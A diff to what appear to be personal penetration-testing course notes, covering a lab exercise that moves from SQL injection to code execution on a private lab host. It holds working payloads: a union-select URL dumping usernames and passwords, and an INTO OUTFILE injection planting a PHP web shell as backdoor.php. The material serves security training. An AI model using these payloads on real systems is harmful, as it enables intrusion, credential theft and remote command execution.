@@ -152,3 +152,16 @@ The reason our malicious queries are being displayed on the screen has to do wit
 The following url will extract usernames and passwords from the "users" table:
 `http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users`
 ![[Pasted image 20220620172230.png]]
+
+
+# 9.9.11 From SQL-Injection to Code Execution
+## Practice - From SQL Injection to Code Execution
+
+_(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_
+
+1.  Exploit the SQL injection along with the MariaDB INTO OUTFILE function to obtain code execution.
+To do this we simply need to append the end of our sql injection url, adding the creation of a malicious php file.
+`http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'`
+
+
+2.  Turn the simple code execution into a full shell.
